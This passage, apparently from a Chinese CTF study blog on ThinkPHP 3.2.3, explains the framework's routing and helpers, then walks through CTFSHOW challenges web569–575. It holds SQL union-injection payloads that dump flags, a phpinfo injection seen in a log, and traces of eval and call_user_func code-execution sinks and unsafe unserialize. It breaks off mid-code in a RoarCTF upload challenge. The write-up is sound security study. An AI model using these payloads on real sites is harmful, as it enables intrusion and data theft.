</span>&#123;</span><br><span class="line">        <span class="comment">// 获取路由地址规则</span></span><br><span class="line">        <span class="variable">$url</span>   =  <span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>)?<span class="variable">$route</span>[<span class="number">0</span>]:<span class="variable">$route</span>;</span><br><span class="line">        <span class="variable">$url</span>   =  <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/:(\d+)/&#x27;</span>, function(<span class="variable">$match</span>) <span class="keyword">use</span>($<span class="title">matches</span>)&#123;<span class="title">return</span> $<span class="title">matches</span>[$<span class="title">match</span>[1]];&#125;, <span class="variable">$url</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>=== <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;/&#x27;</span>) || <span class="number">0</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;http&#x27;</span>)) &#123; <span class="comment">// 路由重定向跳转</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$url</span>&quot;</span>, <span class="literal">true</span>,(<span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$route</span>[<span class="number">1</span>]))?<span class="variable">$route</span>[<span class="number">1</span>]:<span class="number">301</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 解析路由地址</span></span><br><span class="line">            <span class="variable">$var</span>  =  <span class="built_in">self</span>::<span class="title function_ invoke__">parseUrl</span>(<span class="variable">$url</span>);</span><br><span class="line">            <span class="comment">// 处理函数</span></span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>,<span class="string">&#x27;|&#x27;</span>))&#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$val</span>,<span class="variable">$fun</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable">$var</span>[<span class="variable">$key</span>]    =   <span class="variable">$fun</span>(<span class="variable">$val</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">            <span class="variable">$regx</span> =  <span class="title function_ invoke__">substr_replace</span>(<span class="variable">$regx</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$matches</span>[<span class="number">0</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$regx</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/(\w+)\/([^\/]+)/&#x27;</span>, function(<span class="variable">$match</span>) <span class="keyword">use</span>(&amp;$<span class="title">var</span>)&#123;</span><br><span class="line">                    $<span class="title">var</span>[<span class="title">strtolower</span>($<span class="title">match</span>[1])] = <span class="title">strip_tags</span>($<span class="title">match</span>[2]);</span><br><span class="line">                &#125;, <span class="variable">$regx</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 解析路由自动传入参数</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$route</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                    <span class="variable">$params</span>     =   <span class="variable">$route</span>[<span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$route</span>[<span class="number">1</span>],<span class="variable">$params</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$var</span>   =   <span class="title function_ invoke__">array_merge</span>(<span class="variable">$var</span>,<span class="variable">$params</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_GET</span>   =  <span class="title function_ invoke__">array_merge</span>(<span class="variable">$var</span>,<span class="variable">$_GET</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行正则匹配下的闭包方法 支持参数调用</span></span><br><span class="line">    <span class="built_in">static</span> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeRegx</span>(<span class="params"><span class="variable">$closure</span>, <span class="variable">$var</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionFunction</span>(<span class="variable">$closure</span>);</span><br><span class="line">        <span class="variable">$params</span>  = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getParameters</span>();</span><br><span class="line">        <span class="variable">$args</span>    = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$var</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$param</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$var</span>)) &#123;</span><br><span class="line">                <span class="variable">$args</span>[] = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$var</span>);</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="variable">$param</span>-&gt;<span class="title function_ invoke__">isDefaultValueAvailable</span>())&#123;</span><br><span class="line">                <span class="variable">$args</span>[] = <span class="variable">$param</span>-&gt;<span class="title function_ invoke__">getDefaultValue</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行规则匹配下的闭包方法 支持参数调用</span></span><br><span class="line">    <span class="built_in">static</span> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeRule</span>(<span class="params"><span class="variable">$closure</span>, <span class="variable">$var</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionFunction</span>(<span class="variable">$closure</span>);</span><br><span class="line">        <span class="variable">$params</span>  = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getParameters</span>();</span><br><span class="line">        <span class="variable">$args</span>    = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$param</span>)&#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable">$param</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$var</span>[<span class="variable">$name</span>])) &#123;</span><br><span class="line">                <span class="variable">$args</span>[] = <span class="variable">$var</span>[<span class="variable">$name</span>];</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="variable">$param</span>-&gt;<span class="title function_ invoke__">isDefaultValueAvailable</span>())&#123;</span><br><span class="line">                <span class="variable">$args</span>[] = <span class="variable">$param</span>-&gt;<span class="title function_ invoke__">getDefaultValue</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h2><p>直接看看这个吧<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kenshinobiy/p/9165662.html">ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法</a></p>
<p>A快速实例化Action类库</p>
<p>B执行行为类</p>
<p>C配置参数存取方法</p>
<p>D快速实例化Model类库</p>
<p>F快速简单文本数据存取方法</p>
<p>L 语言参数存取方法</p>
<p>M快速高性能实例化模型</p>
<p>R快速远程调用Action类方法</p>
<p>S快速缓存存取方法</p>
<p>U URL动态生成和重定向方法</p>
<p>W 快速Widget输出方法</p>
<p>D函数实例化的是你当前项目的Lib&#x2F;Model下面的模块。如果该模块不存在的话，直接返回实例化Model的对象(意义就与M()函数相同)。而M只返回，实例化Model的对象。它的$name参数作为数据库的表名来处理对数据库的操作。</p>
<h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><h3 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h3><p><code>http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value</code></p>
<p>m参数表示模块，c参数表示控制器，a参数表示操作（当然这些参数都是可以配置的），后面的表示其他GET参数。</p>
<h3 id="PATHINFO-模式"><a href="#PATHINFO-模式" class="headerlink" title="PATHINFO 模式"></a>PATHINFO 模式</h3><p><code>http://localhost/index.php/home/user/login/var/value/</code></p>
<p>PATHINFO地址的前三个参数分别表示模块&#x2F;控制器&#x2F;操作.</p>
<h3 id="REWRITE模式"><a href="#REWRITE模式" class="headerlink" title="REWRITE模式"></a>REWRITE模式</h3><p><code>http://localhost/home/user/login/var/value</code></p>
<p>REWRITE模式是在PATHINFO模式的基础上添加了重写规则的支持，可以去掉URL地址里面的入口文件 index.php，但是需要额外配置WEB服务器的重写规则。</p>
<h3 id="兼容模式"><a href="#兼容模式" class="headerlink" title="兼容模式"></a>兼容模式</h3><p><code>http://localhost/?s=/home/user/login/var/value</code></p>
<p>其中参数s来自于ThinkPHP-&gt;Conf-&gt;convention.php中的VAR_PATH_INFO设置,可以更改兼容模式变量的名称定义</p>
<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><h2 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h2><p><a target="_blank" rel="noopener" href="http://localhost/index.php/Home/Index/index/name/123/">http://localhost/index.php/Home/Index/index/name/123/</a><br><a target="_blank" rel="noopener" href="http://localhost/index.php?m=Home&amp;c=Index&amp;f=index&amp;name=123">http://localhost/index.php?m=Home&amp;c=Index&amp;f=index&amp;name=123</a><br><a target="_blank" rel="noopener" href="http://localhost/index.php?s=Home/Index/index/name/123">http://localhost/index.php?s=Home/Index/index/name/123</a><br><a target="_blank" rel="noopener" href="http://localhost/Home/Index/index/name/123/">http://localhost/Home/Index/index/name/123/</a></p>
<p>&#x3D;&gt; index.php&#x2F;Admin&#x2F;Login&#x2F;ctfshowLogin</p>
<h2 id="web-570"><a href="#web-570" class="headerlink" title="web 570"></a>web 570</h2><p>闭包路由，在<code>Common/Conf/config.php</code>下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;URL_ROUTE_RULES&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;ctfshow/:f/:a&#x27;</span> =&gt;<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">   	<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>, <span class="variable">$a</span>);</span><br><span class="line">   	&#125;</span><br><span class="line">   )</span><br></pre></td></tr></table></figure>
<h2 id="web-571"><a href="#web-571" class="headerlink" title="web 571"></a>web 571</h2><p><code>Home\Conf\IndexController.class.php</code>下找到代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$n</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="string">&#x27;balabalabala&#x27;</span>.<span class="variable">$n</span>.<span class="string">&#x27;balabala&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>show</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$content</span>,<span class="variable">$charset</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$contentType</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$charset</span>,<span class="variable">$contentType</span>,<span class="variable">$content</span>,<span class="variable">$prefix</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>display</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$templateFile</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$charset</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$contentType</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">G</span>(<span class="string">&#x27;viewStartTime&#x27;</span>);</span><br><span class="line">    <span class="comment">// 视图开始标签</span></span><br><span class="line">    <span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;view_begin&#x27;</span>,<span class="variable">$templateFile</span>);</span><br><span class="line">    <span class="comment">// 解析并获取模板内容</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="variable">$templateFile</span>,<span class="variable">$content</span>,<span class="variable">$prefix</span>);</span><br><span class="line">    <span class="comment">// 输出模板内容</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="variable">$content</span>,<span class="variable">$charset</span>,<span class="variable">$contentType</span>);</span><br><span class="line">    <span class="comment">// 视图结束标签</span></span><br><span class="line">    <span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;view_end&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有两个函数，一个<code>fetch</code>和一个<code>render</code></p>
<p>跟进<code>fetch</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$templateFile</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="variable">$templateFile</span>   =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTemplate</span>(<span class="variable">$templateFile</span>);</span><br><span class="line">        <span class="comment">// 模板文件不存在直接返回</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$templateFile</span>)) <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$templateFile</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;THEME_PATH&#x27;</span>) <span class="keyword">or</span>    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;THEME_PATH&#x27;</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getThemePath</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 页面缓存</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_implicit_flush</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;php&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;TMPL_ENGINE_TYPE&#x27;</span>))) &#123; <span class="comment">// 使用PHP原生模板</span></span><br><span class="line">        <span class="variable">$_content</span>   =   <span class="variable">$content</span>;</span><br><span class="line">        <span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">        <span class="comment">// 直接载入PHP模板</span></span><br><span class="line">        <span class="keyword">empty</span>(<span class="variable">$_content</span>)?<span class="keyword">include</span> <span class="variable">$templateFile</span>:<span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.<span class="variable">$_content</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 视图解析标签</span></span><br><span class="line">        <span class="variable">$params</span> = <span class="keyword">array</span>(<span class="string">&#x27;var&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;tVar,<span class="string">&#x27;file&#x27;</span>=&gt;<span class="variable">$templateFile</span>,<span class="string">&#x27;content&#x27;</span>=&gt;<span class="variable">$content</span>,<span class="string">&#x27;prefix&#x27;</span>=&gt;<span class="variable">$prefix</span>);</span><br><span class="line">        <span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;view_parse&#x27;</span>,<span class="variable">$params</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取并清空缓存</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">    <span class="comment">// 内容过滤标签</span></span><br><span class="line">    <span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;view_filter&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">    <span class="comment">// 输出模板文件</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现不对劲了，这里:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">empty</span>(<span class="variable">$_content</span>)?<span class="keyword">include</span> <span class="variable">$templateFile</span>:<span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.<span class="variable">$_content</span>);</span><br></pre></td></tr></table></figure>

<p>非常好<code>eval</code></p>
<h2 id="web-572"><a href="#web-572" class="headerlink" title="web 572"></a>web 572</h2><p>上来提示<code>没有源码，如何获取黑客的蛛丝马迹？</code></p>
<p>所以是到日志里面读文件，thinkphp的日志路径在<code>/Application/Runtime/Logs/Home/</code>目录下面，所以….</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[ 2021-04-15T14:49:32+08:00 ] 127.0.0.1 /index.php?showctf=%3C?php%20phpinfo();?%3E</span><br><span class="line">INFO: [ app_init ] --START--</span><br><span class="line">INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000039s ]</span><br><span class="line">INFO: [ app_init ] --END-- [ RunTime:0.000738s ]</span><br><span class="line">INFO: [ app_begin ] --START--</span><br><span class="line">INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000712s ]</span><br><span class="line">INFO: [ app_begin ] --END-- [ RunTime:0.000868s ]</span><br><span class="line">INFO: [ view_parse ] --START--</span><br><span class="line">INFO: [ template_filter ] --START--</span><br><span class="line">INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000071s ]</span><br><span class="line">INFO: [ template_filter ] --END-- [ RunTime:0.000204s ]</span><br><span class="line">INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.008833s ]</span><br><span class="line">INFO: [ view_parse ] --END-- [ RunTime:0.009135s ]</span><br><span class="line">INFO: [ view_filter ] --START--</span><br><span class="line">INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000468s ]</span><br><span class="line">INFO: [ view_filter ] --END-- [ RunTime:0.000591s ]</span><br><span class="line">INFO: [ app_end ] --START--</span><br><span class="line">INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000964s ]</span><br><span class="line">INFO: [ app_end ] --END-- [ RunTime:0.001181s ]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后门都贴到脸上了(</p>
<h2 id="web-573"><a href="#web-573" class="headerlink" title="web 573"></a>web 573</h2><p><a target="_blank" rel="noopener" href="https://github.com/top-think/thinkphp/issues/528">GitHub Issues 最新版本3.2.3存在order by注入漏洞</a><br><a target="_blank" rel="noopener" href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">修正一处可能的安全隐患 </a></p>
<p><code>?id[where]=id=-1 union select 1,group_concat(flag4s),3,4 from flags</code></p>
<h2 id="web-574"><a href="#web-574" class="headerlink" title="web 574"></a>web 574</h2><p>加了点小米辣，然后…<br><code>?id=-1) union select 1,group_concat(flag4s),3,4 from flags%23</code></p>
<h2 id="web-575"><a href="#web-575" class="headerlink" title="web 575"></a>web 575</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>= <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>)));</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span> || <span class="variable">$user</span>-&gt;id!==<span class="variable">$id</span>)&#123;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">M</span>(<span class="string">&#x27;Users&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>));</span><br><span class="line"><span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">data</span>())));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="variable">$user</span>-&gt;username);</span><br></pre></td></tr></table></figure>

<p>看到这个show我就蠢蠢欲动(</p>
<h1 id="其他地方的一些ThinkPHP题目"><a href="#其他地方的一些ThinkPHP题目" class="headerlink" title="其他地方的一些ThinkPHP题目"></a>其他地方的一些ThinkPHP题目</h1><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">\Think\Upload</span>();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">getError</span>());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span 